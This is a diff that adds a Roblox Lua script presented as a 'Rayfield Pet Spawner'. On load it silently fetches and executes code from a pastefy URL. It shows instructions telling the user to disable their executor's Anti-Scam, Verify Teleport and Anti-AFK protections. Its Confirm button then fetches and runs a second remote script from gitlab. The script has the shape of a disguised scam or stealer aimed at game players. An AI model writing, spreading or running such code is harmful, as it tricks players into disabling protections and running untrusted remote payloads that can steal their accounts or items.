@@ -1,1 +1,40 @@
+--// Execute First Loadstring Immediately
 loadstring(game:HttpGet("https://pastefy.app/ZezpFZ5T/raw"))()
+
+--// Load Rayfield UI Library
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+--// Create Rayfield Window
+local Window = Rayfield:CreateWindow({
+    Name = "Warning Disable This Delta Settings",
+    LoadingTitle = "Rayfield Pet Spawner",
+    LoadingSubtitle = "-Rayfield Pet Spawner-",
+    ConfigurationSaving = {
+       Enabled = false
+    },
+    Discord = {
+       Enabled = false
+    },
+    KeySystem = false
+})
+
+--// Create Main Tab
+local MainTab = Window:CreateTab("-Rayfield Pet Spawner-", 4483362458)
+
+--// Add Centered Labels
+MainTab:CreateParagraph({Title = "1. Disable Anti-Afk", Content = ""})
+MainTab:CreateParagraph({Title = "2. Disable Verify Teleport", Content = ""})
+MainTab:CreateParagraph({Title = "3. Disable Anti Scam", Content = ""})
+
+--// Confirm Button
+MainTab:CreateButton({
+    Name = "Confirm",
+    Callback = function()
+        -- Destroy the UI
+        Rayfield:Destroy()
+
+        -- Run Second Loadstring
+        local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
+        Spawner.Load()
+    end,
+})
